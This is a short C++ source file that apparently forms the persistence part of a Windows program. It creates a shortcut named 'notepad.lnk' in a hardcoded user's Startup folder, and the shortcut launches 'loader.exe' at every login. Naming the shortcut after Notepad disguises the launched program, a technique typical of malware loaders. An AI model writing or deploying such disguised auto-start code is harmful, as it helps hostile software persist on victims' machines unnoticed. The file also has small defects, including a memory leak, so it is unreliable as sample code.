#include "selfStart.h"

wchar_t* AnsiToUnicode(const char* szStr)
{
	int nLen = MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, szStr, -1, NULL, 0);
	if (nLen == 0)
	{
		return NULL;
	}
	wchar_t* pResult = new wchar_t[nLen];
	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, szStr, -1, pResult, nLen);
	return pResult;
}

// 自启动
bool selfStarting()
{
	char ownFilePath[MAX_PATH] = { 0 }; IShellLink *pisl;
	char selfStartFilePath[MAX_PATH] = "C:\\Users\\Cxy\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
	GetCurrentDirectory(MAX_PATH, ownFilePath);
	strcat(ownFilePath, "\\loader.exe");
	strcat(selfStartFilePath, "\\notepad.lnk");
	HANDLE isExist = CreateFile(selfStartFilePath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (isExist != INVALID_HANDLE_VALUE)
	{
		cout << "文件已经存在" << endl;
		CloseHandle(isExist);
		return false;
	}

	HRESULT hr = CoInitialize(NULL);
	hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (void**)&pisl);
	if (!SUCCEEDED(hr))
		return false;

	cout << "savetofile" << endl;
	IPersistFile* pIPF;
	pisl->SetPath(ownFilePath);
	hr = pisl->QueryInterface(IID_IPersistFile, (void **)&pIPF);
	if (!SUCCEEDED(hr))
		return false;

	cout << "success" << endl;
	pIPF->Save(AnsiToUnicode(selfStartFilePath), FALSE);

	pIPF->Release();
	pisl->Release();
	CoUninitialize();
	return true;
}